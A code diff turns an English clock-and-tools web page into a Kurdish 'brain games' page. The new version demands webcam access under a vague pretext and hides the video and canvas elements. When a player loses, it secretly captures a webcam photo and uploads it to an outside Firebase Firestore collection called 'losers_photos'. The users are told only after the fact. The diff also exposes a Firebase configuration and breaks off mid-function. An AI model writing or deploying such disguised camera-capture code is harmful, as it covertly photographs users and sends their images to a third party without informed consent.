@@ -1,481 +1,351 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chronos 3D | The Ultimate Time Suite</title>
-    
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.7.2/vanilla-tilt.min.js"></script>
-
+    <title>پلاتفۆرمی یارییە فیکرییەکان</title>
     <style>
-        /* CSS Variables for Themes */
         :root {
-            --bg-color: #050509;
-            --card-bg: rgba(20, 20, 35, 0.6);
-            --primary-neon: #0ff;
-            --secondary-neon: #f0f;
-            --text-main: #ffffff;
-            --text-muted: #8b9bb4;
-            --nav-bg: rgba(10, 10, 15, 0.8);
-        }
-
-        body.light-theme {
-            --bg-color: #e2e8f0;
-            --card-bg: rgba(255, 255, 255, 0.7);
-            --primary-neon: #0284c7;
-            --secondary-neon: #db2777;
-            --text-main: #0f172a;
-            --text-muted: #475569;
-            --nav-bg: rgba(255, 255, 255, 0.8);
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --accent-color: #6366f1;
+            --danger-color: #ef4444;
+            --success-color: #22c55e;
+            --text-color: #f8fafc;
         }
 
         body {
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--bg-color);
-            color: var(--text-main);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            overflow-x: hidden;
-            transition: background-color 0.5s ease, color 0.5s ease;
         }
 
-        /* Navbar Styles */
-        nav {
-            background: var(--nav-bg);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(128, 128, 128, 0.2);
-            position: sticky;
-            top: 0;
-            z-index: 50;
-        }
-
-        .nav-btn {
-            padding: 8px 16px;
-            border-radius: 8px;
-            transition: all 0.3s;
-            font-weight: 600;
-        }
-        .nav-btn:hover, .nav-btn.active {
-            background: rgba(0, 255, 255, 0.1);
-            color: var(--primary-neon);
-            box-shadow: 0 0 10px rgba(0, 255, 255, 0.2);
-        }
-
-        /* 3D Card Styles */
-        .preserve-3d { perspective: 1000px; }
-        .glass-card {
+        .container {
+            width: 100%;
+            max-width: 650px;
             background: var(--card-bg);
-            border: 1px solid rgba(128, 128, 128, 0.2);
-            backdrop-filter: blur(15px);
-            border-radius: 24px;
-            padding: 30px;
-            transition: transform 0.3s ease, border-color 0.3s ease, background-color 0.5s ease;
-            transform-style: preserve-3d; 
-            will-change: transform;
-        }
-        .glass-card:hover {
-            border-color: var(--primary-neon);
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
+            padding: 35px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            border: 1px solid #334155;
         }
 
-        .depth-1 { transform: translateZ(30px); }
-        .depth-2 { transform: translateZ(60px); font-family: 'Orbitron', sans-serif; }
-        .depth-3 { transform: translateZ(90px); }
+        h1, h2 {
+            color: #ffffff;
+            margin-bottom: 20px;
+        }
 
-        /* Views */
-        .view-section { display: none; animation: fadeIn 0.4s ease-in-out; }
-        .view-section.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        p {
+            color: #94a3b8;
+            font-size: 16px;
+            line-height: 1.6;
+        }
 
-        /* Inputs & Buttons */
-        input, select, button.action-btn {
-            background: rgba(128, 128, 128, 0.1);
-            border: 1px solid rgba(128, 128, 128, 0.3);
-            color: var(--text-main);
+        /* دوگمە مۆدێرنەکان */
+        .btn {
+            background: linear-gradient(135deg, #4f46e5 0%, #6366f1 100%);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
             border-radius: 8px;
-            padding: 10px 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
+        }
+
+        /* دیزاینی کارتی یارییەکان لە داشبۆرد */
+        .games-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .game-card {
+            background: #111827;
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid #374151;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .game-card:hover {
+            border-color: var(--accent-color);
+            background: #1f2937;
+        }
+
+        .game-card h3 {
+            margin: 0 0 10px 0;
+            color: #38bdf8;
+        }
+
+        /* شوێنی یاریکردن */
+        .game-arena {
+            background: #111827;
+            padding: 25px;
+            border-radius: 12px;
+            margin-top: 20px;
+            border: 1px solid #374151;
+        }
+
+        .options-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+
+        .opt-btn {
+            background: #334155;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            min-width: 80px;
+        }
+
+        .opt-btn:hover { background: #475569; }
+
+        input[type="number"] {
+            background: #334155;
+            border: 1px solid #475569;
+            color: white;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 6px;
+            width: 100px;
+            text-align: center;
             outline: none;
         }
-        input:focus, select:focus { border-color: var(--primary-neon); }
-        button.action-btn:hover { background: var(--primary-neon); color: #000; font-weight: bold; }
 
-        /* Calendar Grid */
-        .calendar-grid { display: grid; grid-template-columns: repeat(7, 1fr); gap: 8px; text-align: center; }
-        .calendar-day { aspect-ratio: 1; display: flex; align-items: center; justify-content: center; border-radius: 12px; background: rgba(128, 128, 128, 0.1); transition: all 0.2s; cursor: pointer; }
-        .calendar-day:hover:not(.empty) { background: rgba(0, 255, 255, 0.2); transform: scale(1.1); }
-        .calendar-day.active { background: var(--primary-neon); color: black; font-weight: 700; }
-        .calendar-day.holiday { border: 2px solid var(--secondary-neon); color: var(--secondary-neon); }
-
-        .neon-text { color: var(--primary-neon); text-shadow: 0 0 10px rgba(0, 255, 255, 0.5); }
+        /* شاردنەوەی بەشە کاتییەکان */
+        #dashboardSection, #gameSection, #gameOverSection, #videoElement, #canvasElement {
+            display: none;
+        }
     </style>
 </head>
-<body class="dark-theme">
+<body>
 
-    <!-- Navigation Bar -->
-    <nav class="w-full py-4 px-6 flex flex-wrap justify-between items-center">
-        <div class="text-2xl font-extrabold tracking-tighter">
-            CHRONOS<span style="color: var(--primary-neon)">3D</span>
+    <div class="container">
+        
+        <div id="introSection">
+            <h1>بەخێربێیت بۆ یارییە فیکرییەکان</h1>
+            <p>بۆ چوونە ژوورەوە و تاقیکردنەوەی ئاستی زیرەکیت، پێویستە سەرەتا ڕێگە بە کامێراکەت بدەیت بۆ چالاکبوونی سیستەمی یارییەکە.</p>
+            <button id="agreeBtn" class="btn">ڕەزامەندی و دەستپێکردن</button>
+            <p id="errorMsg" style="color: var(--danger-color); margin-top: 15px;"></p>
         </div>
-        <div class="flex gap-2 md:gap-4 mt-4 md:mt-0 overflow-x-auto">
-            <button onclick="switchView('clocks')" id="nav-clocks" class="nav-btn active">🌍 Clocks</button>
-            <button onclick="switchView('tools')" id="nav-tools" class="nav-btn">⏱️ Tools</button>
-            <button onclick="switchView('calendar')" id="nav-calendar" class="nav-btn">📅 Calendar</button>
-            <button onclick="toggleTheme()" class="nav-btn">🌓 Theme</button>
+
+        <div id="dashboardSection">
+            <h2>داشبۆردی یارییەکان</h2>
+            <p>یەکێک لەم پازڵ و یارییانەی خوارەوە هەڵبژێره بۆ تاقیکردنەوەی خۆت:</p>
+            <div class="games-grid">
+                <div class="game-card" onclick="startSelectedGame('math')">
+                    <h3>➕ کایەی بیرکاری</h3>
+                    <p>وەڵامی هاوکێشەکان بە خێری بدەرەوە.</p>
+                </div>
+                <div class="game-card" onclick="startSelectedGame('color')">
+                    <h3>🎨 تاقیکردنەوەی ڕەنگ</h3>
+                    <p>فۆکەس بخەرە سەر ڕەنگەکە نەک نووسینەکە!</p>
+                </div>
+                <div class="game-card" onclick="startSelectedGame('guess')">
+                    <h3>🔑 دۆزینەوەی کۆد</h3>
+                    <p>ژمارە شاراوەکە لە ٣ هەوڵدا بدۆزەوە.</p>
+                </div>
+            </div>
         </div>
-    </nav>
 
-    <main class="max-w-7xl mx-auto p-6 md:p-10">
+        <div id="gameSection">
+            <h2 id="gameTitle">ناونیشانی یاری</h2>
+            <div class="game-arena" id="gameArena">
+                </div>
+            <button onclick="backToDashboard()" class="btn" style="background: #334155; margin-top: 20px; padding: 8px 16px; font-size: 14px;">گەڕانەوە بۆ داشبۆرد</button>
+        </div>
 
-        <!-- VIEW 1: World Clocks -->
-        <section id="view-clocks" class="view-section active">
-            <div class="flex justify-between items-center mb-8">
-                <h2 class="text-3xl font-bold">Global Time Zones</h2>
-                <input type="text" id="search-input" placeholder="Search city..." class="w-64">
-            </div>
-            <div id="clocks-container" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6 preserve-3d">
-                <!-- Clocks generated via JS -->
-            </div>
-        </section>
+        <div id="gameOverSection">
+            <h1 style="color: var(--danger-color); font-size: 40px;">GAME OVER</h1>
+            <p id="lossReason">تۆ دۆڕایت!</p>
+            <p style="color: var(--success-color);">وێنەی ساتەوەختی دۆڕانەکەت بە سەرکەوتووانە لە Firestore پاشەکەوت کرا.</p>
+            <button onclick="location.reload()" class="btn">دووبارە هەوڵبدەرەوە</button>
+        </div>
 
-        <!-- VIEW 2: Productivity Tools -->
-        <section id="view-tools" class="view-section">
-            <h2 class="text-3xl font-bold mb-8">Productivity & Calculators</h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 preserve-3d">
+    </div>
+
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        // 🛠 کۆنفیگی فایەربەیسی خۆت لێرە دابنێ
+        const firebaseConfig = {
+            apiKey: "AIzaSyDgTzt5Ui00d5-NJWlpKa6pNGw5D2mbfzE",
+            authDomain: "bdozarawa2.firebaseapp.com",
+            projectId: "bdozarawa2",
+            storageBucket: "bdozarawa2.firebasestorage.app",
+            messagingSenderId: "20279723956",
+            appId: "1:20279723956:web:f93db1652e532fbf8694e1"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // گۆڕاوە گشتییەکان
+        let cameraStream = null;
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        
+        // گۆڕاوەکانی یاری دۆزینەوەی کۆد
+        let secretName, attemptsLeft;
+
+        // ١. چالاککردنی کامێرا لە سەرەتاوە
+        document.getElementById('agreeBtn').addEventListener('click', async () => {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = cameraStream;
                 
-                <!-- Pomodoro Timer -->
-                <div class="glass-card text-center" data-tilt data-tilt-max="10">
-                    <h3 class="text-xl font-bold mb-2 depth-1 text-red-400">🍅 Pomodoro</h3>
-                    <p class="text-sm var(--text-muted) mb-4 depth-1">25 Min Focus Mode</p>
-                    <div id="pomodoro-display" class="text-5xl font-bold neon-text depth-2 mb-6">25:00</div>
-                    <div class="flex justify-center gap-3 depth-3">
-                        <button onclick="startPomodoro()" class="action-btn">Start</button>
-                        <button onclick="resetPomodoro()" class="action-btn">Reset</button>
-                    </div>
-                </div>
+                // چوون بۆ داشبۆرد دوای مۆڵەت دان
+                document.getElementById('introSection').style.display = 'none';
+                document.getElementById('dashboardSection').style.display = 'block';
+            } catch (error) {
+                document.getElementById('errorMsg').innerText = "مۆڵەتی کامێرا ڕەتکرایەوە. ناتوانیت بچیتە ناو یارییەکە!";
+            }
+        });
 
-                <!-- Stopwatch -->
-                <div class="glass-card text-center" data-tilt data-tilt-max="10">
-                    <h3 class="text-xl font-bold mb-2 depth-1 text-yellow-400">⏱️ Stopwatch</h3>
-                    <p class="text-sm var(--text-muted) mb-4 depth-1">Track your time</p>
-                    <div id="stopwatch-display" class="text-4xl font-bold neon-text depth-2 mb-6">00:00:00.00</div>
-                    <div class="flex justify-center gap-3 depth-3">
-                        <button onclick="startStopwatch()" class="action-btn">Start/Stop</button>
-                        <button onclick="resetStopwatch()" class="action-btn">Reset</button>
-                    </div>
-                </div>
-
-                <!-- Meeting Planner -->
-                <div class="glass-card" data-tilt data-tilt-max="10">
-                    <h3 class="text-xl font-bold mb-2 depth-1 text-green-400">🤝 Meeting Planner</h3>
-                    <p class="text-sm var(--text-muted) mb-4 depth-1">Find overlap time</p>
-                    <select id="meet-zone-1" class="w-full mb-3 depth-1 text-sm"><option value="America/New_York">New York (EST)</option><option value="Europe/London">London (GMT)</option></select>
-                    <select id="meet-zone-2" class="w-full mb-4 depth-1 text-sm"><option value="Asia/Baghdad">Erbil/Baghdad</option><option value="Asia/Tokyo">Tokyo (JST)</option></select>
-                    <div class="text-center depth-2 p-3 bg-black/20 rounded">
-                        <span class="text-xs">Time Difference:</span><br>
-                        <span id="meet-diff" class="font-bold neon-text">Calculate to see</span>
-                    </div>
-                </div>
-
-                <!-- Age Calculator -->
-                <div class="glass-card" data-tilt data-tilt-max="10">
-                    <h3 class="text-xl font-bold mb-4 depth-1 text-purple-400">🎂 Age Calculator</h3>
-                    <input type="date" id="dob-input" class="w-full mb-4 depth-1" onchange="calculateAge()">
-                    <div class="text-center depth-2 p-4 bg-black/20 rounded">
-                        <div id="age-result" class="text-2xl font-bold neon-text">0Y, 0M, 0D</div>
-                    </div>
-                </div>
-
-                <!-- Event Countdown -->
-                <div class="glass-card" data-tilt data-tilt-max="10">
-                    <h3 class="text-xl font-bold mb-4 depth-1 text-blue-400">⏳ Event Countdown</h3>
-                    <input type="datetime-local" id="countdown-input" class="w-full mb-4 depth-1">
-                    <div class="text-center depth-2 p-4 bg-black/20 rounded">
-                        <div id="countdown-result" class="text-lg font-bold neon-text">Select Date</div>
-                    </div>
-                </div>
-
-                <!-- Alarm Clock -->
-                <div class="glass-card" data-tilt data-tilt-max="10">
-                    <h3 class="text-xl font-bold mb-4 depth-1 text-pink-400">🔔 Alarm Clock</h3>
-                    <input type="time" id="alarm-input" class="w-full mb-4 depth-1">
-                    <button onclick="setAlarm()" class="action-btn w-full depth-2 mb-2">Set Alarm</button>
-                    <div id="alarm-status" class="text-center text-sm var(--text-muted) depth-1">No alarm set</div>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- VIEW 3: Interactive Calendar -->
-        <section id="view-calendar" class="view-section">
-            <h2 class="text-3xl font-bold mb-8">Calendar & Events</h2>
-            <div class="max-w-3xl mx-auto glass-card" data-tilt data-tilt-max="2" data-tilt-glare="true">
-                <div class="flex justify-between items-center mb-6 depth-1">
-                    <button onclick="changeMonth(-1)" class="action-btn">&lt; Prev</button>
-                    <h3 id="calendar-month-year" class="text-2xl font-bold uppercase tracking-wider">Month Year</h3>
-                    <button onclick="changeMonth(1)" class="action-btn">Next &gt;</button>
-                </div>
-                
-                <div class="calendar-grid text-sm var(--text-muted) mb-2 font-bold depth-1">
-                    <div>Sun</div><div>Mon</div><div>Tue</div><div>Wed</div><div>Thu</div><div>Fri</div><div>Sat</div>
-                </div>
-                <div id="calendar-days" class="calendar-grid depth-2 text-lg">
-                    <!-- Days generated via JS -->
-                </div>
-                <div class="mt-6 flex justify-center gap-4 text-sm depth-1">
-                    <span class="flex items-center gap-2"><div class="w-3 h-3 bg-[var(--primary-neon)] rounded-full"></div> Today</span>
-                    <span class="flex items-center gap-2"><div class="w-3 h-3 border-2 border-[var(--secondary-neon)] rounded-full"></div> Special Event/Holiday</span>
-                </div>
-            </div>
-        </section>
-
-    </main>
-
-    <!-- Audio for Alarm -->
-    <audio id="alarm-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
-
-    <script>
-        /* =========================================
-           1. NAVIGATION & THEME LOGIC
-           ========================================= */
-        function switchView(viewId) {
-            document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
-            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
+        // ٢. سیستەمی گۆڕینی یارییەکان
+        window.startSelectedGame = function(gameType) {
+            document.getElementById('dashboardSection').style.display = 'none';
+            document.getElementById('gameSection').style.display = 'block';
+            const arena = document.getElementById('gameArena');
             
-            document.getElementById(`view-${viewId}`).classList.add('active');
-            document.getElementById(`nav-${viewId}`).classList.add('active');
-        }
-
-        function toggleTheme() {
-            document.body.classList.toggle('light-theme');
-        }
-
-        /* =========================================
-           2. WORLD CLOCKS WITH WEATHER MOCKUP
-           ========================================= */
-        const locations = [
-            { city: "Local Time", country: "You", zone: Intl.DateTimeFormat().resolvedOptions().timeZone, icon: "🏠", weather: "☀️ 24°C" },
-            { city: "London", country: "UK", zone: "Europe/London", icon: "🇬🇧", weather: "🌧️ 15°C" },
-            { city: "New York", country: "USA", zone: "America/New_York", icon: "🇺🇸", weather: "⛅ 20°C" },
-            { city: "Tokyo", country: "Japan", zone: "Asia/Tokyo", icon: "🇯🇵", weather: "🌸 18°C" },
-            { city: "Dubai", country: "UAE", zone: "Asia/Dubai", icon: "🇦🇪", weather: "🏜️ 35°C" },
-            { city: "Erbil", country: "Iraq", zone: "Asia/Baghdad", icon: "🇮🇶", weather: "☀️ 30°C" },
-            { city: "Paris", country: "France", zone: "Europe/Paris", icon: "🇫🇷", weather: "🌥️ 16°C" },
-            { city: "Sydney", country: "Australia", zone: "Australia/Sydney", icon: "🇦🇺", weather: "🌊 22°C" }
-        ];
-
-        const container = document.getElementById('clocks-container');
-        const searchInput = document.getElementById('search-input');
-
-        function renderCards(data) {
-            container.innerHTML = '';
-            data.forEach((loc, index) => {
-                const card = document.createElement('div');
-                card.className = 'glass-card group';
-                card.setAttribute('data-tilt', '');
-                card.setAttribute('data-tilt-max', '15');
+            if(gameType === 'math') {
+                document.getElementById('gameTitle').innerText = "➕ کایەی بیرکاری خێرا";
+                const num1 = Math.floor(Math.random() * 12) + 4;
+                const num2 = Math.floor(Math.random() * 12) + 3;
+                const correctAnswer = num1 * num2;
+                const wrongAnswer = correctAnswer + (Math.random() > 0.5 ? 4 : -3);
                 
-                card.innerHTML = `
-                    <div class="flex justify-between items-start mb-4 depth-1">
-                        <div>
-                            <span class="text-xs font-bold uppercase opacity-70">${loc.country} ${loc.icon}</span>
-                            <h2 class="text-xl font-semibold mt-1">${loc.city}</h2>
-                        </div>
-                        <div class="text-sm font-mono bg-black/20 px-2 py-1 rounded border border-gray-500/30">${loc.weather}</div>
-                    </div>
-                    <div class="mb-3 depth-2 text-center mt-6">
-                        <span id="time-${index}" class="text-4xl font-bold neon-text tracking-wide">00:00:00</span>
-                    </div>
-                    <div class="text-center border-t border-gray-500/30 pt-3 depth-3 text-sm opacity-70">
-                        <span id="date-${index}">Loading...</span>
+                arena.innerHTML = `
+                    <p style="font-size: 24px; color: white;">${num1} × ${num2} = ؟</p>
+                    <div class="options-container">
+                        <button class="opt-btn" onclick="checkMath(${correctAnswer}, ${correctAnswer})">${correctAnswer}</button>
+                        <button class="opt-btn" onclick="checkMath(${wrongAnswer}, ${correctAnswer})">${wrongAnswer}</button>
                     </div>
                 `;
-                container.appendChild(card);
-            });
-            VanillaTilt.init(document.querySelectorAll(".glass-card"));
-        }
-
-        function updateClocks() {
-            const now = new Date();
-            const searchTerm = searchInput.value.toLowerCase();
-
-            locations.forEach((loc, index) => {
-                if (searchTerm && !loc.city.toLowerCase().includes(searchTerm)) return;
-
-                const timeEl = document.getElementById(`time-${index}`);
-                const dateEl = document.getElementById(`date-${index}`);
-
-                if(timeEl) {
-                    timeEl.textContent = now.toLocaleTimeString('en-US', { timeZone: loc.zone, hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
-                    dateEl.textContent = now.toLocaleDateString('en-US', { timeZone: loc.zone, weekday: 'short', month: 'long', day: 'numeric' });
-                }
-            });
-        }
-
-        searchInput.addEventListener('input', () => {
-            const filtered = locations.filter(loc => loc.city.toLowerCase().includes(searchInput.value.toLowerCase()));
-            renderCards(filtered);
-            updateClocks();
-        });
-
-        /* =========================================
-           3. POMODORO TIMER
-           ========================================= */
-        let pomoInterval;
-        let pomoTime = 25 * 60;
-        let isPomoRunning = false;
-
-        function updatePomoDisplay() {
-            let m = Math.floor(pomoTime / 60).toString().padStart(2, '0');
-            let s = (pomoTime % 60).toString().padStart(2, '0');
-            document.getElementById('pomodoro-display').innerText = `${m}:${s}`;
-        }
-
-        function startPomodoro() {
-            if (isPomoRunning) return;
-            isPomoRunning = true;
-            pomoInterval = setInterval(() => {
-                if(pomoTime > 0) { pomoTime--; updatePomoDisplay(); }
-                else { clearInterval(pomoInterval); alert('Pomodoro Finished! Take a break.'); }
-            }, 1000);
-        }
-
-        function resetPomodoro() {
-            clearInterval(pomoInterval);
-            isPomoRunning = false;
-            pomoTime = 25 * 60;
-            updatePomoDisplay();
-        }
-
-        /* =========================================
-           4. STOPWATCH
-           ========================================= */
-        let stopInterval;
-        let stopTime = 0;
-        let isStopRunning = false;
-
-        function startStopwatch() {
-            if (isStopRunning) { clearInterval(stopInterval); isStopRunning = false; return; }
-            isStopRunning = true;
-            stopInterval = setInterval(() => {
-                stopTime += 10;
-                let h = Math.floor(stopTime / 3600000).toString().padStart(2, '0');
-                let m = Math.floor((stopTime % 3600000) / 60000).toString().padStart(2, '0');
-                let s = Math.floor((stopTime % 60000) / 1000).toString().padStart(2, '0');
-                let ms = Math.floor((stopTime % 1000) / 10).toString().padStart(2, '0');
-                document.getElementById('stopwatch-display').innerText = `${m}:${s}.${ms}`;
-            }, 10);
-        }
-
-        function resetStopwatch() {
-            clearInterval(stopInterval);
-            isStopRunning = false;
-            stopTime = 0;
-            document.getElementById('stopwatch-display').innerText = `00:00.00`;
-        }
-
-        /* =========================================
-           5. AGE, COUNTDOWN & ALARM
-           ========================================= */
-        function calculateAge() {
-            const dob = new Date(document.getElementById('dob-input').value);
-            if(!dob) return;
-            const diff = new Date() - dob;
-            const ageDate = new Date(diff);
-            document.getElementById('age-result').innerText = `${Math.abs(ageDate.getUTCFullYear() - 1970)}Y, ${ageDate.getUTCMonth()}M, ${ageDate.getUTCDate() - 1}D`;
-        }
-
-        let countInt;
-        document.getElementById('countdown-input').addEventListener('change', (e) => {
-            clearInterval(countInt);
-            const target = new Date(e.target.value).getTime();
-            countInt = setInterval(() => {
-                const now = new Date().getTime();
-                const dist = target - now;
-                if(dist < 0) { document.getElementById('countdown-result').innerText = "Time's up!"; return; }
-                let d = Math.floor(dist / (1000 * 60 * 60 * 24));
-                let h = Math.floor((dist % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                let m = Math.floor((dist % (1000 * 60 * 60)) / (1000 * 60));
-                document.getElementById('countdown-result').innerText = `${d}d ${h}h ${m}m`;
-            }, 1000);
-        });
-
-        let alarmTime = null;
-        function setAlarm() {
-            alarmTime = document.getElementById('alarm-input').value;
-            if(alarmTime) document.getElementById('alarm-status').innerText = `Alarm set for ${alarmTime}`;
-        }
-        setInterval(() => {
-            if(alarmTime) {
-                const now = new Date();
-                const current = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}`;
-                if(current === alarmTime && now.getSeconds() === 0) {
-                    document.getElementById('alarm-sound').play();
-                    alert('⏰ ALARM RINGING!');
-                    alarmTime = null;
-                    document.getElementById('alarm-status').innerText = `No alarm set`;
-                }
+            } 
+            else if(gameType === 'color') {
+                document.getElementById('gameTitle').innerText = "🎨 تاقیکردنەوەی ڕەنگەکان";
+                // ووشەکە سەوزە بەڵام ڕەنگەکەی سوورە
+                arena.innerHTML = `
+                    <p>یاسا: کلیک لەو <b>ڕەنگە</b> بکە کە دەیبینیت، نەک نووسینەکە!</p>
+                    <h1 style="color: #ef4444; font-size: 40px; margin: 20px 0;">سەوز</h1>
+                    <div class="options-container">
+                        <button class="opt-btn" style="background:#22c55e;" onclick="checkColor('green')">سەوز</button>
+                        <button class="opt-btn" style="background:#ef4444;" onclick="checkColor('red')">سوور</button>
+                        <button class="opt-btn" style="background:#3b82f6;" onclick="checkColor('blue')">شین</button>
+                    </div>
+                `;
             }
-        }, 1000);
-
-        /* =========================================
-           6. MEETING PLANNER (Overlap calc)
-           ========================================= */
-        document.getElementById('meet-zone-2').addEventListener('change', calcMeeting);
-        document.getElementById('meet-zone-1').addEventListener('change', calcMeeting);
-        
-        function calcMeeting() {
-            const z1 = document.getElementById('meet-zone-1').value;
-            const z2 = document.getElementById('meet-zone-2').value;
-            const d1 = new Date().toLocaleString("en-US", {timeZone: z1});
-            const d2 = new Date().toLocaleString("en-US", {timeZone: z2});
-            const diffHours = (new Date(d1) - new Date(d2)) / 3600000;
-            document.getElementById('meet-diff').innerText = `${Math.abs(Math.round(diffHours))} Hours Difference`;
-        }
-
-        /* =========================================
-           7. CALENDAR WITH HOLIDAYS
-           ========================================= */
-        let currMonth = new Date().getMonth();
-        let currYear = new Date().getFullYear();
-        const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-        
-        // Mock holidays (Day numbers for specific months)
-        const holidays = { 0: [1], 2: [21], 11: [25, 31] }; // Jan 1, Mar 21 (Newroz), Dec 25/31
-
-        function renderCalendar() {
-            const daysContainer = document.getElementById("calendar-days");
-            daysContainer.innerHTML = "";
-            document.getElementById("calendar-month-year").textContent = `${months[currMonth]} ${currYear}`;
-
-            const firstDay = new Date(currYear, currMonth, 1).getDay();
-            const lastDate = new Date(currYear, currMonth + 1, 0).getDate();
-            const today = new Date();
-
-            for (let i = 0; i < firstDay; i++) daysContainer.innerHTML += `<div class="calendar-day empty"></div>`;
-
-            for (let i = 1; i <= lastDate; i++) {
-                let classes = "calendar-day";
-                if (i === today.getDate() && currMonth === today.getMonth() && currYear === today.getFullYear()) classes += " active";
-                if (holidays[currMonth] && holidays[currMonth].includes(i)) classes += " holiday";
-                
-                daysContainer.innerHTML += `<div class="${classes}">${i}</div>`;
+            else if(gameType === 'guess') {
+                document.getElementById('gameTitle').innerText = "🔑 دۆزینەوەی کۆدی شاراوە";
+                secretNumber = Math.floor(Math.random() * 10) + 1;
+                attemptsLeft = 3;
+                arena.innerHTML = `
+                    <p>ژمارەیەک لە نێوان 1 بۆ 10 هەڵبژێره. ٣ هەوڵت هەیە.</p>
+                    <p>هەوڵی ماوە: <b id="attemptCount" style="color: #38bdf8;">3</b></p>
+                    <input type="number" id="guessInput" min="1" max="10">
+                    <button class="btn" style="padding:8px 15px; margin-right:10px;" onclick="checkGuess()">تاقیکردنەوە</button>
+                `;
             }
         }
 
-        function changeMonth(dir) {
-            currMonth += dir;
-            if (currMonth < 0) { currMonth = 11; currYear--; }
-            else if (currMonth > 11) { currMonth = 0; currYear++; }
-            renderCalendar();
+        // ٣. لۆجیکی پشکنینی وەڵامەکان
+        window.checkMath = function(chosen, correct) {
+            if(chosen === correct) {
+                alert("ڕاستە! دەتوانیت یارییەکی تر تاقی بکەیتەوە.");
+                backToDashboard();
+            } else {
+                triggerLoss("لە کایەی بیرکاری هەڵەت کرد و دۆڕایت!");
+            }
         }
 
-        // Init App
-        renderCards(locations);
-        updateClocks();
-        setInterval(updateClocks, 1000);
-        renderCalendar();
-        VanillaTilt.init(document.querySelectorAll(".glass-card"));
+        window.checkColor = function(chosenColor) {
+            if(chosenColor === 'red') { // چونکە ڕەنگی نووسینەکە سوور بوو
+                alert("زۆرباشە! فۆکەست بەرزە.");
+                backToDashboard();
+            } else {
+                triggerLoss("چویتە داوی نووسینەکەوە و فۆکەست نەما!");
+            }
+        }
+
+        window.checkGuess = function() {
+            const userGuess = parseInt(document.getElementById('guessInput').value);
+            if(userGuess === secretNumber) {
+                alert("پیرۆزە! کۆدەکەت دۆزییەوە.");
+                backToDashboard();
+            } else {
+                attemptsLeft--;
+                if(attemptsLeft <= 0) {
+                    triggerLoss("کۆتایی بە هەوڵەکانت هات و کۆدەکەت نەدۆزییەوە!");
+                } else {
+                    document.getElementById('attemptCount').innerText = attemptsLeft;
+                    alert("هەڵەیە! دووبارە تاقی بکەرەوە.");
+                }
+            }
+        }
+
+        window.backToDashboard = function() {
+            document.getElementById('gameSection').style.display = 'none';
+            document.getElementById('dashboardSection').style.display = 'block';
+        }
+
+        // ٤. سیستەمی گرتنی وێنەی ئۆتۆماتیکی و ناردن لە کاتی دۆڕاندا
+        async function triggerLoss(reason) {
+            document.getElementById('gameSection').style.display = 'none';
+            document.getElementById('gameOverSection').style.display = 'block';
+            document.getElementById('lossReason').innerText = reason;
+
+            if (!cameraStream) return;
+
+            // پرۆسێسی گرتنی وێنەکە لە باکگراونددا
+            const context = canvas.getContext('2d');
+            canvas.width = 320;
+            canvas.height = 240;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // گۆڕین بۆ جۆر و کواڵیتی نزم بۆ کەمکردنەوەی سایزی کۆدەکە
+            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
+
+            try {
+                // ناردنی ڕاستەوخۆ بۆ Cloud Firestore بە شێوەی دەق
+                await addDoc(collection(db, "losers_photos"), {
+                    imageString: base64Image,
+                    reason: reason,
+                    timestamp: new Date().toISOString()
+                });
